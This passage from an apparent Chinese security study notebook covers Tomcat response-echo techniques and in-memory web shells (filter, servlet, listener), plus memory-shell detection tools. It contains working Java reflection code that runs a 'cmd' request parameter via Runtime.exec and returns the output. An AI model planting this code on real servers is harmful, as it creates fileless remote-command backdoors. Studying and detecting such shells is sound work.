分析继承关系，发现它有子类Http11NioProtocol，所以如果我们获取到这个类，那么也能获取到global [!note] Tomcat初始化StandardService时，会启动Container、Executor、mapperListener及所有的Connector。其中Executor负责为Connector处理请求提供共用的线程池，mapperListener负责将请求映射到对应的容器中，Connector负责接收和解析请求。所以对于单个请求来说，其相关的信息及调用关系都保存在Connector对象中 分析调用栈，发现存在这个类，org.apache.catalina.connector.CoyoteAdapter#connector的protocolHandler属性值类就是Http11NioProtocol ((AbstractProtocol.ConnectionHandler) ((Http11NioProtocol) connector.protocolHandler).handler).global.processors.get(0).req.getResponse() 所以现在的思路是如何获取到这个connector，新的利用链 connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response Litch1师傅分析出在Tomcat启动过程中会创建connector对象，并通过org.apache.catalina.core.StandardService#addConnector存放在connectors中 然后通过org.apache.catalina.core.StandardService#initInternal进行初始化 因为先添加了再初始化，所以这个时要获取connectors，可以通过org.apache.catalina.core.StandardService来获取 所以利用链 StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response 所以最后就是如何获得StandardService了，这里利用的是tomcat放弃了双亲委派模型的思路 [!note] 双亲委派机制的缺点：当加载同个jar包不同版本库的时候，该机制无法自动选择需要版本库的jar包。特别是当Tomcat等web容器承载了多个业务之后，不能有效的加载不同版本库。为了解决这个问题，Tomcat放弃了双亲委派模型。 Tomcat加载机制简单讲，WebAppClassLoader负责加载本身的目录下的class文件，加载不到时再交给CommonClassLoader加载，这和双亲委派刚好相反。 通过Thread.currentThread().getContextClassLoader()来获取当前线程的ClassLoader，再从resources->context->context当中寻找即可。 所以最终的手法 Thread.currentThread().getContextClassLoader()->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->processors->RequestInfo->req->response global链路代码 [!note] 尽可能的找到能够直接通过函数获取到想要的数据，实在不行再使用反射 1、获取StandardContext org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext(); Thread.currentThread().getContextClassLoader().getClass()的值为org.apache.catalina.loader.ParallelWebappClassLoader，它继承了WebappClassLoaderBase，而resources变量是WebappClassLoaderBase类中的，所以这里如果也想使用反射的话，需要如下： // 获取 StandardContext ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); Field resources = org.apache.catalina.loader.WebappClassLoaderBase.class.getDeclaredField(\"resources\"); resources.setAccessible(true); org.apache.catalina.webresources.StandardRoot standardRoot = (StandardRoot) resources.get(contextClassLoader); StandardContext standardContext = (StandardContext) standardRoot.getContext(); 2、获取StandardContext中的context Field context = standardContext.getClass().getDeclaredField(\"context\"); context.setAccessible(true); org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext); 3、获取context中的service Field service = applicationContext.getClass().getDeclaredField(\"service\"); service.setAccessible(true); org.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext); 4、获取service中的connectors Field connectors = standardService.getClass().getDeclaredField(\"connectors\"); connectors.setAccessible(true); org.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService); 5、反射获取 AbstractProtocol$ConnectoinHandler 实例 ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler(); Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\"); handler.setAccessible(true); org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler); 6、反射获取global内部的processors org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal(); Field processors = requestGroupInfo.getClass().getDeclaredField(\"processors\"); processors.setAccessible(true); ArrayList processors1 = (ArrayList) processors.get(requestGroupInfo); 7、获取response输出内容 Field req = RequestInfo.class.getDeclaredField(\"req\"); req.setAccessible(true); for (org.apache.coyote.RequestInfo requestInfo : processors1) { org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo); // 转换为 org.apache.catalina.connector.Request 类型 org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1); org.apache.catalina.connector.Response response1 = request2.getResponse(); PrintWriter writer = response1.getWriter(); writer.write(\"tomcat echo\"); writer.flush(); } 代码汇总： // 获取 StandardContext org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); try { // 反射获取StandardContext中的context Field context = standardContext.getClass().getDeclaredField(\"context\"); context.setAccessible(true); org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext); // 反射获取context中的service Field service = applicationContext.getClass().getDeclaredField(\"service\"); service.setAccessible(true); org.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext); // 反射获取service中的connectors Field connectors = standardService.getClass().getDeclaredField(\"connectors\"); connectors.setAccessible(true); org.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService); // 反射获取 AbstractProtocol$ConnectoinHandler 实例 ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler(); Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\"); handler.setAccessible(true); org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler); // 反射获取global内部的processors org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal(); Field processors = requestGroupInfo.getClass().getDeclaredField(\"processors\"); processors.setAccessible(true); ArrayList processors1 = (ArrayList) processors.get(requestGroupInfo); // 获取response修改数据 // 下面循环，可以在这先获取req实例，避免每次循环都反射获取一次 Field req = RequestInfo.class.getDeclaredField(\"req\"); req.setAccessible(true); for (org.apache.coyote.RequestInfo requestInfo : processors1) { org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo); // 转换为 org.apache.catalina.connector.Request 类型 org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1); org.apache.catalina.connector.Response response1 = request2.getResponse(); // 获取参数 PrintWriter writer = response1.getWriter(); String cmd = request2.getParameter(\"cmd\"); if (cmd != null) { Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { writer.write(disr); disr = dataInputStream.readLine(); } } writer.flush(); } } catch (IllegalAccessException illegalAccessException) { illegalAccessException.printStackTrace(); } catch (NoSuchFieldException noSuchFieldException) { noSuchFieldException.printStackTrace(); } 效果 跟踪Registry.registerComponent() 跟进org.apache.tomcat.util.modeler.Registry#registerComponent(java.lang.Object, javax.management.ObjectName, java.lang.String)这个函数，发现会给RequestInfo对象注册到MBeanServer中 oname的值为Tomcat:name=HttpRequest1,type=RequestProcessor,worker=\"http-nio-8080\" 所以如果能通过MBeanServer来获取到相关的信息，会更加的方便直接 分析一下，通过Registry#getMBeanServer()函数能够直接获取到MBeanServer实例 所以现在问题是怎么拿到org.apache.tomcat.util.modeler.Registry这个类的实例，我们还是分析一下应用是怎么拿到的，然后模拟一下即可 它是直接使用Registry.getRegistry(null, null)来获取的 所以我们也模拟一下这个过程，整个过程中变量.getClass是什么类我们就给他转换为什么类即可 如jmxMBeanServer.mbsInterceptor.getClass()的类是com.sun.jmx.interceptor.DefaultMBeanServerInterceptor，我们就给他转换过去即可 老实说MBeanServer到RequestInfo的过程还是有点难找，不知道有没有啥快的办法，还是大佬们牛逼 com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer(); com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) jmxMBeanServer.mbsInterceptor; com.sun.jmx.mbeanserver.Repository repository = defaultMBeanServerInterceptor.repository; repository.query(new ObjectName(\"*:type=GlobalRequestProcessor,name=\\\"http*\\\"\"), null); 这里由于测试的关系只存在一个对象，在具体构造时可以直接遍历所有符合条件的情况。有了RequestInfo，那我们就可以拿到response完成回显了 利用链： jmxMBeanServer->resource（和上面的global一样）->->processors->RequestInfo->req->response MBeanServer链路代码 这个比上面的要简单一些，可以尝试自己多写写 try { com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer(); Field mbsInterceptor = com.sun.jmx.mbeanserver.JmxMBeanServer.class.getDeclaredField(\"mbsInterceptor\"); mbsInterceptor.setAccessible(true); com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) mbsInterceptor.get(jmxMBeanServer); Field repository = defaultMBeanServerInterceptor.getClass().getDeclaredField(\"repository\"); repository.setAccessible(true); com.sun.jmx.mbeanserver.Repository repository1 = (Repository) repository.get(defaultMBeanServerInterceptor); HashSet hashSet = (HashSet) repository1.query(new javax.management.ObjectName(\"*:type=GlobalRequestProcessor,name=\\\"http*\\\"\"), null); for (com.sun.jmx.mbeanserver.NamedObject namedObject : hashSet ) { Field object = namedObject.getClass().getDeclaredField(\"object\"); object.setAccessible(true); org.apache.tomcat.util.modeler.BaseModelMBean baseModelMBean = (BaseModelMBean) object.get(namedObject); Field resource = baseModelMBean.getClass().getDeclaredField(\"resource\"); resource.setAccessible(true); org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) resource.get(baseModelMBean); Field processors = requestGroupInfo.getClass().getDeclaredField(\"processors\"); processors.setAccessible(true); ArrayList processors1 = (ArrayList) processors.get(requestGroupInfo); // 获取response修改数据 // 下面循环，可以在这先获取req实例，避免每次循环都反射获取一次 Field req = RequestInfo.class.getDeclaredField(\"req\"); req.setAccessible(true); for (org.apache.coyote.RequestInfo requestInfo : processors1) { org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo); // 转换为 org.apache.catalina.connector.Request 类型 org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1); org.apache.catalina.connector.Response response1 = request2.getResponse(); // 获取参数 PrintWriter writer = response1.getWriter(); String cmd = request2.getParameter(\"cmd\"); if (cmd != null) { Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while (disr != null) { writer.write(disr); disr = dataInputStream.readLine(); } } writer.flush(); } } } catch (NoSuchFieldException | IllegalAccessException | MalformedObjectNameException e) { e.printStackTrace(); } 效果： 总结 最后代码实现过程还是比较简单，主要还是分析过程找到一条可利用的链 平时我们要拿到一个内存中的实例对象，主要有两种方法： 反射 向上回溯分析，应用是怎么初始化这个实例的，找关联函数、类、类变量等，再得到这个实例 向上一直回溯到可以通过一些方法获取到内存中的实例为止，如Registry.getRegistry(null, null).getMBeanServer()，相当于找到整条链的头 编写代码过程中不知道返回的对象是哪一个类的，可以通过debug调试看到，然后再进行类型转换 [!WARNING|style:flat] 如有错误，敬请指正 参考 Tomcat通用回显学习 Tomcat回显技术学习汇总 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-10 17:06:07 "},"个人知识库/02.代码审计/01.Java安全/05.内存马/01.Tomcat内存马.html":{"url":"个人知识库/02.代码审计/01.Java安全/05.内存马/01.Tomcat内存马.html","title":"01.Tomcat内存马","keywords":"","body":" 内存马简介 什么是内存马 如何实现内存马 内存马类型 背景知识 Java web三大件 Servlet 请求的处理过程 servlet生命周期 代码示例 Filter 基本工作原理 filter的生命周期 filter链 代码示例 Listener 代码示例 Tomcat Tomcat架构设计 其他知识 反射 java instrumentation servlet-api内存马编写 Filter内存马 ServletContext ApplicationContext Filter相关变量 动态注入内存 Servlet内存马 启动 动态注入内存 Listener内存马 ServletRequestListener接口 动态注入内存 servlet-api总结 内存马查杀 arthas copagent java-memshell-scanner 参考 内存马简介 什么是内存马 随着每年攻防对抗强度的增加，普通的webshell在各大厂商的安全设备下，根本难以存活，想要落地一个实体webshell的难度逐渐增大。逐步完善的过滤机制、前后端分离的趋势，使得传统的webshell生存空间越来越小。于是，随着时代的发展，内存马出现了。 内存马就是一种无需落地文件就能使用的webshell，它将恶意代码写入内存，拦截固定参数来达到webshell的效果。 如何实现内存马 实现目标：访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果 实现方法：以java为例，客户端发起的web请求会依次经过Listener-->Filter-->Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。 内存马类型 根据注入的方式，大概分类以下两类： servlet-api型 通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马 字节码增强型 通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。 背景知识 Java web三大件 详情的可以自己去研究，搜索关键词maven tomcat servlet 开发，这里大概描述一下 Servlet Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。 请求的处理过程 浏览器向 Web 服务器发送了一个 HTTP 请求，Servlet容器根据收到的请求，会先创建一个 HttpServletRequest 和 HttpServletResponse 对象 调用相应的 Servlet 程序，在 Servlet 程序运行时，它首先会从 HttpServletRequest 对象中读取数据信息，然后通过 service() 方法处理请求消息 service()方法根据请求类型，分别调用doGet或者doPost方法，其中doXXX方法是我们自己写的逻辑Controller 将处理后的响应数据写入到 HttpServletResponse 对象中。 Web 服务器会从 HttpServletResponse 对象中读取到响应数据，并发送给浏览器 容器关闭时候，会调用destory方法 需要注意的是，在Web服务器运行阶段，每个Servlet都只会创建一个实例对象，针对每次HTTP请求，Web服务器都会调用所请求Servlet实例的 service（HttpServletRequest request，HttpServletResponse response）方法，并重新创建一个 request 对象和一个 response 对象。 servlet生命周期 服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。 servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行 服务器关闭时，销毁这个servlet对象，执行destroy()方法。 由JVM进行垃圾回收。 代码示例 Filter filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。 简单来说就是在Servlet处理请求前和Servlet响应请求后实现一些特殊的功能 基本工作原理 1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。 2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。 3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。 4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。 5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。 6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。 filter的生命周期 当服务器启动，就会创建Filter对象（随着Tomcat的启动而创建），并调用init()方法，只调用一次 当访问资源时，路径与filter拦截路径匹配，会执行Filter中的doFilter方法，这个方法是真正拦截操作的方法。 当服务器关闭时，会调用Filter中的destroy方法来进行销毁操作。 filter链 当多个filter同时存在的时候，组成了filter链。 web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。 代码示例 Listener 程序开发中，经常需要对某些事件进行监听，比如监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。 事件：用户的一个操作，如点击按钮 事件源：产生事件的对象。 监听器：负责监听发生在事件源上的事件。 注册监听：将事件，事件源，监听器绑定在一起。当事件源上发生某个事件后，执行监听器代码。 代码示例 import javax.servlet.ServletContextEvent; import javax.servlet.ServletContextListener; import javax.servlet.annotation.WebListener; import javax.servlet.http.HttpSessionAttributeListener; import javax.servlet.http.HttpSessionEvent; import javax.servlet.http.HttpSessionListener; import javax.servlet.http.HttpSessionBindingEvent; @WebListener() public class HelloListener implements ServletContextListener, HttpSessionListener, HttpSessionAttributeListener { // Public constructor is required by servlet spec public HelloListener() { } // ------------------------------------------------------- // ServletContextListener implementation // ------------------------------------------------------- public void contextInitialized(ServletContextEvent sce) { // 初始化资源，例如打开数据库连接池等: /* This method is called when the servlet context is initialized(when the Web application is deployed). You can initialize servlet context related data here. */ } public void contextDestroyed(ServletContextEvent sce) { // 清理WebApp,例如关闭数据库连接池等 /* This method is invoked when the Servlet Context (the Web application) is undeployed or Application Server shuts down. */ } // ------------------------------------------------------- // HttpSessionListener implementation // ------------------------------------------------------- public void sessionCreated(HttpSessionEvent se) { /* Session is created. */ } public void sessionDestroyed(HttpSessionEvent se) { /* Session is destroyed. */ } // ------------------------------------------------------- // HttpSessionAttributeListener implementation // ------------------------------------------------------- public void attributeAdded(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is added to a session. */ } public void attributeRemoved(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is removed from a session. */ } public void attributeReplaced(HttpSessionBindingEvent sbe) { /* This method is invoked when an attribute is replaced in a session. */ } } Tomcat 简单理解，tomcat是http服务器+servlet容器。 Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将响应的信息封装为HttpServletResponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。 Tomcat架构设计 Tomcat 的本质其实就是一个 WEB 服务器 + 一个 Servlet 容器，那么它必然需要处理网络的连接与 Servlet 的管理，因此，Tomcat 设计了两个核心组件来实现这两个功能，分别是连接器和容器，连接器用来处理外部网络连接，容器用来处理内部 Servlet 一个 Tomcat 代表一个 Server 服务器，一个 Server 服务器可以包含多个 Service 服务，Tomcat 默认的 Service 服务是 Catalina，而一个 Service 服务可以包含多个连接器，因为 Tomcat 支持多种网络协议，包括 HTTP/1.1、HTTP/2、AJP 等等，一个 Service 服务还会包括一个容器，容器外部会有一层 Engine 引擎所包裹，负责与处理连接器的请求与响应，连接器与容器之间通过 ServletRequest 和 ServletResponse 对象进行交流。 在Container容器中包含4个子容器，且存在包含关系，分别是： 容器 实现类 含义 Engine org.apache.catalina.core.StandardEngine 最顶层容器组件，可以包含多个Host Host org.apache.catalina.core.StandardHost 一个Host代表一个虚拟主机，如a.com、b.com，其下可以有多个Context Context org.apache.catalina.core.StandardContext 一个Context代表一个Web应用，如/example、/ROOT、/manager，其下可有多个Wrapper Wrapper org.apache.catalina.core.StandardWrapper 一个Wrapper通常代表一个Servlet，是对Servlet的封装 一个engine可以对一个多个host，也就是虚拟主机，一个host可以对应多个context，也就是web应用，一个context对应多个wrapper，也就是servlet。这个映射关系，通过mapper组件来关联，mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系。Host容器的域名，Context容器中的web路径，Wrapper容器中的servlet映射的路径，这些配置信息是多层次的Map。根据请求定位到指定servlet的流程图如下： 其他知识 反射 反射提供的功能，能在运行时（动态）的 获取一个类的所有成员变量和方法 创建一个类的对象 a. 获取对象成员变量&赋值 b. 调用对象的方法 c. 判断对象所属的类 在注入内存马的过程当中，我们可能需要用到反射机制，例如注入一个servlet型的内存马，我们需要使用反射机制来获取当前的context，然后将恶意的servlet（wrapper）添加到当前的context的children中。 在使用Java反射机制时，主要步骤包括： 获取目标类型的Class对象 通过Class对象分别获取Constructor类对象、Method类对象和Field类对象 通过Constructor类对象、Method类对象和Field类对象分别获取类的构造函数、方法&属性的具体信息，并进行后续操作 java instrumentation Java Intrumentation 和相关应用 动态 Instrumentation 是 Java SE 5 的新特性，它在 java.lang.instrument 包中，它把 Java 的 instrument 功能从本地代码中释放出来，使其可以用 Java 代码的方式解决问题。使用 Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至可以替换和修改某些类的定义。有了这样的功能，开发者就可以实现更为灵活的虚拟机监控和 Java的类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP方式，使得开发者无需对原有应用做任何修改，就可以实现类的动态修改和增强 java.lang.instrument 包被赋予了更强大的功能：启动后的 监测、本地代码（native code）监测，以及动态改变 classpath 等等。这些改变，意味着 Java 具有了更强的动态控制与解释能力，它使得 Java 语言变得更加灵活多变。 Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互。 在注入内存马的过程中，我们可以利用java instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。 servlet-api内存马编写 所有内存马编写时，都可以自己写一个对应的东西，比如filter、servlet，然后去跟一下Tomcat本身是如何去添加这些东西的，最后模拟一下这个过程动态添加就行了 Filter内存马 Filter 内存马是通过动态注册以一个恶意Filter，由于是动态注册的，所以这个filter没有文件实体，存在内存中，当tomcat重启就消失了 一般我们把这个Filter放在所有的filter最前面优先执行，也就是filter链的第一个，这样我们的请求就不会受到其他filter的干扰 需要动态注册filter就需要添加filter相关的库、函数等 ServletContext 需要动态注册filter就需要几个添加filter相关的函数，ServletContext恰好可以满足这个条件 javax.servlet.servletContext中存在addFilter，addServlet，addListener方法，即添加Filter，Servlet，Listener 获取ServletContext的方法：this.getServletContext();、this.getServletConfig().getServletContext(); ApplicationContext 在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取上下文StandardContext Filter相关变量 名称 说明 filterMaps 变量 存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern filterDefs 变量 存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息 filterConfigs 变量 存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息 FilterChain 变量 过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter ApplicationFilterChain 调用过滤器链 ApplicationFilterConfig 获取过滤器 ApplicationFilterFactory 组装过滤器链 StandardContext Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper** StandardWrapperValve 一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet org.apache.catalina.core.ApplicationFilterConfig 在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef // tomcat 7 import org.apache.catalina.deploy.FilterMap; import org.apache.catalina.deploy.FilterDef; // tomcat 8/9 import org.apache.tomcat.util.descriptor.web.FilterMap; import org.apache.tomcat.util.descriptor.web.FilterDef; 动态注入内存 需要调试的话，直接给想要调试的代码写到servlet里面就可以调试了，避免去尝试调试JSP 流程： 创建一个恶意Filter 利用FilterDef对Filter进行一个封装 将FilterDef添加到FilterDefs和FilterConfig 创建FilterMap ，将我们的Filter和urlpattern相对应，存放到filterMaps中（由于Filter生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的Filter最先触发） Tomcat中的对应的ServletContext实现是ApplicationContext，在Web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。 当我们能直接获取 request 的时候，可以直接将 ServletContext 转为 StandardContext 从而获取 context。 Servlet内存马 启动 常规情况下在启动时，会自动调用StandardContext.addServletMappingDecoded()方法给我们定义的路由和名字加进去，所有后面动态注入也是利用的这个方法，获取到StandardContext然后添加即可，前提是要给这个servlet先添加到children中 servletMappings和前提判断条件 findChild() addChild() 会给我们创建的servlet/wrapper添加到children中 动态注入内存 下面的代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。 执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。 比如早期rebeyond师傅开发的memshell，就是通过修改org.apache.catalina.core.ApplicationFilterChain类的internalDoFilter方法来实现的，后期冰蝎最新版本的内存马为了实现更好的兼容性，选择hook javax.servlet.http.HttpServlet#service 函数，在weblogic选择hook weblogic.servlet.internal.ServletStubImpl#execute 函数。 Listener内存马 Listener的监听主要分为三类： ServletContext监听：用于对Servlet整个上下文进行监听（创建、销毁） Session监听：对Session的整体状态的监听 Request监听：用于对Request请求进行监听（创建、销毁） 对于这三类，熟悉java和Tomcat的同学应该知道，对于request的请求和篡改是常见的利用方式，另两者涉及到服务器的启动跟停止，或者是Session的建立跟销毁，就不太适合 ServletRequestListener接口 该接口实现的方法有requestDestroyed，requestInitialized，分别是在监听request请求结束，以及request请求开始，我们着重看请求开始的部分 在requestInitialized这个函数中，我们从servletRequestEvent参数中取cmd参数，在当前上下文只要在任意路由下监听到了cmd参数存在值，那么就执行命令，具体操作如下 public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } 这里是没有回显的，盲的 动态注入内存 servlet-api总结 以上三种根据Servlet的特性，动态注入，jsp文件只要落地，即可动态加载到内存中 姿势 优点 缺点 Filter 通过添加全局拦截器对参数进行拦截，来进行恶意代码执行通过添加filtermap，可以随便设置路由，所有请求都会过该拦截器 引入filterMaps，filterDef，要根据tomcat版本来判断代码量较高 Servlet 简单方便，了解Servlet生命周期即可更直观了解如何动态添加ServletMapping 无法使所有参数都经过恶意代码，只能在我们自己设定的url中才能触发 Listener 简单方便，通过添加监听器对request进行监控在任意url中都能设置我们监听的参数 只要监听的参数含有就会进入监听代码中如果在该jsp页面下访问，则会重放请求 内存马查杀 查杀感觉很多都是依赖于Java agent去查杀的。 arthas Arthas 是Alibaba开源的Java诊断工具 地址：https://github.com/alibaba/arthas 使用文档 很详细，可以慢慢研究 下载arthas-boot.jar，然后用java -jar的方式启动： curl -O https://arthas.aliyun.com/arthas-boot.jar java -jar arthas-boot.jar 通过mbean命令，可以便捷的查看或监控 Mbean 的属性信息（可以查看异常Filter/Servlet节点） 使用jad反编译class源码(感觉是依赖于cfr-decompiler这个小工具) copagent Java内存马提取工具，arthas的改进版，可以确定风险等级，并且将内存中的信息全部输出 地址：https://github.com/LandGrey/copagent 下载cop.jar，然后启动 wget https://github.com/LandGrey/copagent/raw/release/cop.jar java -jar cop.jar 查看输出结果 找到相关的class文件并反编译 java-memshell-scanner 通过jsp脚本扫描并查杀各类中间件内存马，比Java agent要温和一些。 地址：https://github.com/c0ny1/java-memshell-scanner dump下来反编译 参考 Tomcat内存马 tomcat无文件内存webshell Tomcat Filter类型内存马与查杀技术学习：比较详细比较细，分析每一步为什么要这样做也很详细 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:02 "},"个人知识库/02.代码审计/01.Java安全/05.内存马/02.Spring内存马.html":{"url":"个人知识库/02.代码审计/01.Java安全/05.内存马/02.Spring内存马.html","title":"02.Spring内存马","keywords":"","body":" 前言 基础知识 Bean ApplicationContext 其他 Root Context 和 Child Context ContextLoaderListener DispatcherServlet Controller实现方式 Controller技术实现 获取上下文的环境 手动注册Controller 方法一:registerMapping 方法二:registerHandler 方法三：detectHandlerMethods webshell 注意事项 SpringBoot生命周期 Interceptor实现 拦截器代码 正常注册拦截器 效果 恶意注册拦截器 应用场景 漏洞演示 参考 前言 之前学习了Tomcat的内存马，但是Spring也是比较常用的框架，所以大佬们重点研究了 SpringMVC，并实现了利用多种不同的技术手段，往内存中注入恶意 Webshell 代码的无文件攻击技术。 基础知识 具体可以过一下SpringMVC的开发，基于框架开发比较便捷和简单 Bean bean是Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。 在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean。 通俗来讲： bean 是对象 bean 被 IoC 容器管理 Spring 应用主要是由一个个的 bean 构成的 ApplicationContext ApplicationContext是 spring 中较高级的容器。和 BeanFactory 类似，它可以加载配置文件中定义的 bean，将所有的 bean 集中在一起，当有请求的时候分配 bean。 